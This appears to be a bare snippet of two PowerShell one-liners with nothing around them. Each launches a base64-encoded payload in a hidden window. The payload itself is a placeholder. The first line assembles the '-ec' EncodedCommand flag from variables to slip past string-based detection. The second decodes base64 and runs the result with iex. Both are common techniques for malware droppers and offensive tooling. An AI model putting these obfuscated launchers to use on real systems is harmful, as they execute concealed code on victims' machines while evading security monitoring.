powershell -w 1 -C "sv EY -;sv u ec;sv Ot ((gv EY).value.toString()+(gv u).value.toString());powershell (gv Ot).value.toString() '<BASE64_CODE>'"

powershell -w 1 -C "iex ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('BASE64_CODE')))"
